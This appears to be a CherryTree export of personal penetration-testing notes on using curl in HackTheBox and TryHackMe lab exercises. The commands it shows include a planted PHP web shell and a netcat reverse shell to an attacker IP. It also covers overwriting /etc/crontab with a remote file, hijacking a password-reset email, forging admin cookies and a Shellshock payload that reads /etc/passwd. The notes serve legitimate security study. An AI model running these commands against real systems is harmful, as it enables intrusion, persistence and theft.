<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>curl & dns</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>curl & dns</h1><br/><p>DNS Isolation (Igintion@HTB) can be temporarily solved by adding IP &amp; Virutal Host Name in our local hosts file.</p><p></p><p>‚îå‚îÄ‚îÄ(rootüíÄmatrix)-[~]</p><p>‚îî‚îÄ# cat /etc/hosts</p><p>127.0.0.1       localhost</p><p>127.0.1.1       matrix.matrix.securex.net       matrix</p><p>10.129.88.45    ignition.htb</p><p></p><p></p><p>curl -v http://{Target_IP}</p><p></p><p><img src="images/17-1.png" alt="images/17-1.png" /></p><p></p><p></p><p></p><p>tee is used to edit here...</p><p></p><p><img src="images/17-2.png" alt="images/17-2.png" /></p><p></p><p><strong></strong></p><p><strong>More About Curl</strong></p><p></p><p>curl -s <a href="http://10.10.10.150/secret.txt">http://10.10.10.150/secret.txt</a> | base64 -d &amp;&amp; echo</p><p></p><p>-s For Silent Mode</p><p></p><p>After Getting Remote Code Execution for a php web server.</p><p>[In the index.php we managed to add ‚Äúsystem($_REQUEST[‚Äã&#39;pwn&#39;‚Äã]);‚Äù  ]</p><p>On Browser:</p><p><a href="http://10.10.10.150/index.php?pwn=id">http://10.10.10.150/index.php?pwn=id</a></p><p>Curl Terminal Alternative:</p><p>curl <a href="http://10.10.10.150/index.php">http://10.10.10.150/index.php</a> -G --data-urlencode ‚Äòpwn=id‚Äô</p><p></p><p>-G For GET method, rather than post. </p><p>--data-urlencode : Converts the commands into url readable form http://.....php?pwn=</p><p></p><p></p><p>Reverse shell Example</p><p>curl <a href="http://10.10.10.150/index.php">http://10.10.10.150/index.php</a> -G --data-urlencode ‚Äã&#39;pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 1234 &gt;/tmp/f&#39;</p><p></p><p></p><p>curl -K config_file : This option is used a specify a config file. The values will override the -o output.</p><p></p><p>Example contents of config_file:</p><p>url = ‚Äã&quot;<a href="http://10.10.14.2/crontab">http://10.10.14.2/crontab</a>&quot;</p><p>output = ‚Äã&quot;/etc/crontab&quot;</p><p></p><p></p><p><strong>Base Password Change Request:</strong></p><p>curl &#39;<a href="http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm'">http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm&#39;</a> -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&#39;</p><p></p><p><strong>Demonized Password Change Request(bob gets a mail):</strong></p><p>curl &#39;<a href="http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm'">http://10.10.226.40/customers/reset?email=robert%40acmeitsupport.thm&#39;</a> -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -d &#39;username=robert&amp;email=bob@customer.acmeitsupport.thm&#39;</p><p></p><p></p><p><strong>Tampering the Cookies:</strong></p><p></p><p>curl -H &quot;Cookie: logged_in=true; admin=true&quot; <a href="http://10.10.226.40/cookie-test">http://10.10.226.40/cookie-test</a></p><p></p><p></p><p><strong>Custom User Agent using Curl:</strong></p><p></p><p>Curl can be used to insert a custom user-agent using -A switch as follows. (Used in Shellshock of <strong>0day</strong>)</p><p></p><p>curl -A &quot;() { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd&quot; <a href="http://10.10.55.169/cgi-bin/test.cgi">http://10.10.55.169/cgi-bin/test.cgi</a></p></div>
</body>
</html>
